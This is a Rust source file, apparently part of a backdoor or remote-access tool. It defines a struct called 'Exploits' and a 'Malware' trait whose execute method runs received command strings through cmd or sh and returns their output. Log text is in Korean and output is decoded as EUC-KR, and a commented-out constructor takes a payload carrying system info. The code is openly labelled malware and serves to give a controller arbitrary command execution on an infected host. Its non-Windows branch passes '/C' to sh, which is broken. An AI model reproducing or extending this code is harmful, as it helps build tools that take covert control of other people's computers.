use std::process::{Command};
use encoding_rs::EUC_KR;

#[derive(Debug)]
pub struct Exploits {
    exploit_input: Vec<u8>,
    shell: Command
}

impl Exploits {
    pub fn default() -> Exploits {
        Exploits {
            exploit_input: vec![],
            shell: Exploits::shell()
        }
    }

    // pub fn from(payload: StructStonePayload) -> Exploits {
    //
    //     Exploits {
    //         sys_info: payload.sysinfo,
    //         exploit_input: payload.command_input,
    //         exploit_output: vec![],
    //         shell: Exploits::shell()
    //     }
    // }
    pub fn shell() -> Command {
        if cfg!(target_os = "windows") { Command::new("cmd") }
        else { Command::new("sh") }
    }
}

pub trait Malware {
    fn execute(&mut self) -> Vec<u8>;
    fn command(&mut self, command:Vec<u8>) -> Exploits;
}

impl Malware for Exploits {
    fn execute(&mut self) -> Vec<u8> {

        let exploit_input = match String::from_utf8(self.exploit_input.clone()) {
            Ok(r) => r.split("'").collect::<Vec<_>>()[1].to_string(),
            Err(_) => "".to_string()
        };

        println!("명령 : {} 실행", exploit_input);

        let exploit_output =
            self.shell
                .args(["/C", &exploit_input])
                .output()
                .expect("failed to execute process");

        let exploit_output = match exploit_output.stdout.is_empty() {
            true => exploit_output.stderr,
            false => exploit_output.stdout
        };

        println!("{:?}", EUC_KR.decode(exploit_output.as_slice()));

        exploit_output
    }

    fn command(&mut self, command:Vec<u8>) -> Exploits{
        Exploits {
            exploit_input: command,
            shell: Exploits::shell(),
        }
    }
}
